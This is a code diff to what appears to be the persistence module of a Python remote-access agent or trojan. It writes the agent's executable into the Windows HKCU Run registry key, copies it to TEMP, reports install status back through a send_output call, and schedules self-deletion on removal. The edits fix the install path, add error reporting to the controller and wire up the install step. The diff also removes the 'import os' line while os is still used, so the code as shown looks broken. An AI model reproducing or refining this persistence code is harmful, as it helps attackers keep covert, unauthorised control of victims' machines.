@@ -1,4 +1,3 @@
-import os
 import sys
 import subprocess
 import shutil
@@ -21,22 +20,31 @@ EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)
 
 def install():
     if not is_installed():
-        stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + "\\" + EXECUTABLE_NAME))
-        shutil.copyfile(EXECUTABLE_PATH, os.environ["TEMP"] + "/" + EXECUTABLE_NAME)
-
+        try:
+            stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + "\\" + EXECUTABLE_NAME))
+            shutil.copyfile(EXECUTABLE_PATH, os.environ["TEMP"] + "/" + EXECUTABLE_NAME)
+        except Exception as e:
+            message = "Persistence: failed to install the agent: %s" % (e)
+            utils.send_output(message)
+            print message
 
 def clean():
     subprocess.Popen("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % SERVICE_NAME,
-                         shell=True)
+        shell=True)
     subprocess.Popen(
         "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "\"cmd.exe /c del %USERPROFILE%\\" + EXECUTABLE_NAME + "\""),
-                          shell=True)
+            shell=True)
 
 
 def is_installed():
-    output = os.popen(
-        "reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME)
-    if SERVICE_NAME in output.read():
+    stdin, stdout, stderr = os.popen3("reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME)
+    error = stderr.read()
+    if error:
+        message = "Persistence: failed to run command to install in registry: %s" % (error)
+        utils.send_output(message)
+        print message
+        return True
+    if SERVICE_NAME in stdout.read():
         return True
     else:
         return False
@@ -44,6 +52,7 @@ def is_installed():
 
 def run(action):
     if action == "install":
+        install()
         utils.send_output("Persistence installed")
     elif action == "remove":
         clean()
